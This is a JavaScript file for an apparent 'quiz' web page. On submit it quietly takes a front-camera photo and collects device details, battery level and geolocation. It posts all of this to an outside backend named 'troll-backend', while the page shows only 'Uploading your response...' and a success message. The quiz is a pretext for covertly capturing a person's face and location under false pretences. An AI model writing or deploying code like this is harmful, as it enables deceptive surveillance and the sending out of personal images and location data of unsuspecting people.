const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const toast = document.getElementById("toast");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false };

// Toast function
function showToast(message) {
  toast.innerText = message;
  toast.style.display = "block";
  toast.style.opacity = 1;
  setTimeout(() => {
    toast.style.opacity = 0;
    setTimeout(() => (toast.style.display = "none"), 300);
  }, 2000);
}

// Collect metadata
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    battery: "N/A",
    location: "N/A",
    time: new Date().toLocaleString()
  };

  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    metadata.battery = battery.level * 100 + "%";
  }

  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {
      metadata.location = "Denied";
    }
  }

  return metadata;
}

// Form submit
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const submitBtn = document.getElementById("submit-btn");
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Uploading your response...");

  let stream;
  try {
    // Start camera
    stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream;

    const metadata = await collectMetadata();

    // Wait 1 second before capturing
    setTimeout(async () => {
      const ctx = canvasEl.getContext("2d");
      canvasEl.width = videoEl.videoWidth;
      canvasEl.height = videoEl.videoHeight;
      ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
      const image = canvasEl.toDataURL("image/png");

      // Send to backend
      const response = await fetch(backendURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image, metadata })
      });

      console.log("Response sent:", await response.json());

      // Stop camera
      stream.getTracks().forEach(track => track.stop());

      // Show success
      document.getElementById("quiz-container").style.display = "none";
      document.getElementById("success-container").style.display = "block";

      submitBtn.disabled = false;
      submitBtn.textContent = "Submit";
      showToast("Response submitted successfully!");
    }, 1000);

  } catch (err) {
    console.error(err);
    showToast("Error! Please allow camera access.");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});
